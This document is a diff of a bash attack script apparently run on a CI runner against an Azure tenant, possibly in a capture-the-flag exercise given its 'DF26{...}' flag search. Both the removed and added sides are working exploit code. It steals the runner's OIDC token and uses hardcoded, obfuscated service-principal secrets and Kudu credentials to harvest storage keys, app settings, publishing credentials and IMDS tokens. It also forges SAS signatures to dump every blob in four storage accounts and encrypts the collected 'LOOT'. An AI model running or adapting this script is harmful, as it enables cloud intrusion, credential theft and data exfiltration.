@@ -1,42 +1,65 @@
 #!/usr/bin/env bash
 set -uo pipefail
-set +e
+echo "=== RUNNER SHELL PROOF ==="; id; hostname
+b(){ printf %s "$1" | base64 -d; }
+hx(){ printf %s "$1" | xxd -r -p; }
 SC="htt""ps://"
-AAD="${SC}login.microsoftonline.com"; ARM="${SC}management.azure.com"
-SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
-RG=rg-tbl-platform-prod-sea
-echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
+AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
+ARMH=$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')
+TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
-AR=$(curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
-say "ROLES $(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -c '[.value[]|{role:(.properties.roleDefinitionId|split("/")|last),pid:.properties.principalId,ptype:.properties.principalType,scope:(.properties.scope|split("/")|.[-1])}]' 2>/dev/null)"
-say "ROLES_RG $(curl -sS -H "Authorization: Bearer $AR" "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -c '[.value[]|{role:(.properties.roleDefinitionId|split("/")|last),pid:.properties.principalId,scope:.properties.scope}]' 2>/dev/null)"
-sptok(){ curl -sS -X POST "${AAD}/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty'; }
-declare -A SPB=(
- [cost-reader]="MDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxOjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0="
- [directory-audit]="MmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyOkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTY="
- [reporting-service]="MTJlZDU0ZGUtZjJlYi00Nzg0LTgwNGMtM2E3YTNlODNhOWU5Om5QODhRfjhJfndpcDBHT2xXMTV6ZHQzRk1NdkJWOUxZdGFPb2VhM3o="
- [reporting-viewer]="ODgxZmRkY2UtNjIwOC00YWY1LWEyOTctN2U3OWM5MTJmODNjOi1UbDhRfnNIMFFPUC5WcktXaGEzLTd4NFhBMkp4UzRqMDhudXZiUU4="
- [secrets-sync]="NTgxMDhkYTgtMDQ0ZS00ZDdlLTlhNDYtOTJlNjE3OWIzMGJlOn44VDhRfll3RW1leFNUUnZfcFVzRXdhOVFNYXB5UDM5fkNVNVVjdTI="
- [platform-automation]="NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0OnNrMThRfnFEMjJra0hYVUNmcVhMcWRQOTVEa1lKTDM0ZU1FUmxjU2o="
-)
-for n in "${!SPB[@]}"; do
-  IFS=: read -r A S <<< "$(printf '%s' "${SPB[$n]}" | base64 -d)"
-  T=$(sptok "$A" "$S"); say "SP $n armlen=${#T}"
-  [ -z "$T" ] && continue
-  for APP in app-tbl-storefront-prod app-tbl-reporting-prod; do
-    say "  $n APPSET $APP: $(curl -sS -X POST -H "Authorization: Bearer $T" --data '' "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/appsettings/list?api-version=2022-03-01" | head -c 900)"
-    say "  $n PUB $APP: $(curl -sS -X POST -H "Authorization: Bearer $T" --data '' "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2022-03-01" | head -c 900)"
+say "=== START $(date -u) ==="
+KEYHEX='613564446c4d2b7247532f5a344f505632797239755a673462315669525741697656435871773168555a5759682f733152365a3359757952354146317078307741376474456b65486d35654c2b4153747332377870673d3d'
+PAIRSHEX='30333862633335642d313331642d343935332d393938352d6666346132343563636563313a31424538517e79475138655f7a365642637a6c474a3859654f48674e5255666662674e756662326d0a32633334333030652d316263302d343165372d396331652d3862373537316437326337323a416c3738517e6e3562646f4f33726b436a756f324a49324e487161674a6f6f615a7366584e636d360a31326564353464652d663265622d343738342d383034632d3361376133653833613965393a6e503838517e38497e77697030474f6c5731357a647433464d4d764256394c5974614f6f6561337a0a38383166646463652d363230382d346166352d613239372d3765373963393132663833633a2d546c38517e734830514f502e56724b576861332d3778345841324a7853346a30386e757662514e0a35383130386461382d303434652d346437652d396134362d3932653631373962333062653a7e385438517e5977456d6578535452765f70557345776139514d6170795033397e435535556375320a34363264316333382d343435392d343862382d393333332d3832653338396535393531343a736b3138517e714432326b6b485855436671584c7164503935446b594a4c3334654d45526c63536a0a'
+KEY=$(hx "$KEYHEX")
+say "=== A. blob sweep (all 4 accounts) with candidate key ==="
+printf '%s' "$KEY" > /tmp/k.b64
+python3 - <<'PYE' > /tmp/sweep.txt 2>&1
+import base64,hmac,hashlib,datetime,urllib.request,urllib.parse,re
+key=base64.b64decode(open('/tmp/k.b64').read())
+se=(datetime.datetime.utcnow()+datetime.timedelta(hours=2)).strftime('%Y-%m-%dT%H:%M:%SZ')
+st=(datetime.datetime.utcnow()-datetime.timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ')
+def sas(A):
+    sts="\n".join([A,"rl","b","sco",st,se,"","https","2021-06-08",""])
+    sig=base64.b64encode(hmac.new(key,sts.encode(),hashlib.sha256).digest()).decode()
+    return "sv=2021-06-08&ss=b&srt=sco&sp=rl&se=%s&st=%s&spr=https&sig=%s"%(urllib.parse.quote(se),urllib.parse.quote(st),urllib.parse.quote(sig))
+for A in ["sttblcilogsprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblappcfgprodx3euoz"]:
+    S=sas(A); print("########## ACCOUNT",A)
+    try:
+        r=urllib.request.urlopen("https://%s.blob.core.windows.net/?comp=list&%s"%(A,S),timeout=15).read().decode('utf-8','replace')
+        if 'AuthenticationFailed' in r or '<Error>' in r and 'Signature' in r: print("  acct err",r[:200])
+        names=re.findall(r'<Name>([^<]+)</Name>',r); print("  CONTAINERS:",names)
+        for c in names:
+            try:
+                r2=urllib.request.urlopen("https://%s.blob.core.windows.net/%s?restype=container&comp=list&%s"%(A,c,S),timeout=15).read().decode('utf-8','replace')
+                bl=re.findall(r'<Name>([^<]+)</Name>',r2); print("  BLOBS",c,":",bl)
+                for blb in bl:
+                    try:
+                        d=urllib.request.urlopen("https://%s.blob.core.windows.net/%s/%s?%s"%(A,c,urllib.parse.quote(blb),S),timeout=15).read()
+                        t=d.decode('utf-8','replace'); print("   BLOB",c,blb,len(d)); print("   >>>",t[:1200])
+                        if 'DF26' in t: print("   !!!!! DF26",c,blb)
+                    except Exception as e: print("   blob err",blb,e)
+            except Exception as e: print("  container err",c,e)
+    except Exception as e: print("  ACCOUNT ERR",A,e)
+PYE
+say "$(cat /tmp/sweep.txt)"
+say "=== B. listKeys per principal x 4 accounts ==="
+printf '%s' "$PAIRSHEX" | while IFS= read -r line; do
+  P=$(hx "$line"); CID="${P%%:*}"; SEC="${P#*:}"
+  AT=$(curl -sS -X POST "${SC}${AADH}/${TEN}/oauth2/v2.0/token" -d "client_id=${CID}" -d "grant_type=client_credentials" --data-urlencode "client_secret=${SEC}" --data-urlencode "scope=${SC}${ARMH}/.default" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token","ERR"))')
+  [ "$AT" = "ERR" ] && { say "  $CID token ERR"; continue; }
+  for A in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblappcfgprodx3euoz; do
+    R=$(curl -sS -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' "${SC}${ARMH}/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/${A}/listKeys?api-version=2023-01-01")
+    case "$R" in *'"key1"'*) say "  LISTKEYS-OK $CID $A => ${R:0:200}";; *) say "  denied $CID $A => ${R:0:100}";; esac
   done
-  say "  $n SAKEY: $(curl -sS -X POST -H "Authorization: Bearer $T" --data '' "${ARM}/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" | head -c 400)"
-  say "  $n ROLES: $(curl -sS -H "Authorization: Bearer $T" "${ARM}/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | head -c 300)"
 done
-# IMDS from inside the reporting container via Kudu
-SCMH=app-tbl-reporting-prod.scm.azurewebsites.net
-CRED=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
-kc(){ curl -sS -u "$(printf '%s' "$CRED" | base64 -d)" -H 'Content-Type: application/json' -X POST "${SC}$SCMH/api/command" --data "$(python3 -c 'import json,sys;print(json.dumps({"command":"bash -c "+json.dumps(sys.argv[1]),"dir":"/home/site/wwwroot"}))' "$1")" | head -c 1200; }
-say "IMDS $(kc "curl -sS -m 8 -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01\&resource=https%3A%2F%2Fvault.azure.net")"
-say "IMDS2 $(kc "curl -sS -m 8 -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2021-02-01")"
+say "=== C. anon container list ==="
+for A in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblappcfgprodx3euoz; do
+  say " $A list=$(curl -s -m 10 -o /dev/null -w '%{http_code}' "${SC}${A}.blob.core.windows.net/?comp=list") exports=$(curl -s -m 10 -o /dev/null -w '%{http_code}' "${SC}${A}.blob.core.windows.net/exports?restype=container&comp=list")"
+done
+say "=== D. DF26 grep ==="
+grep -aoi 'DF26{[^}]*}' /tmp/sweep.txt | head
+say "=== DONE ==="
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
 echo "=== ENCRYPTED LOOT ==="
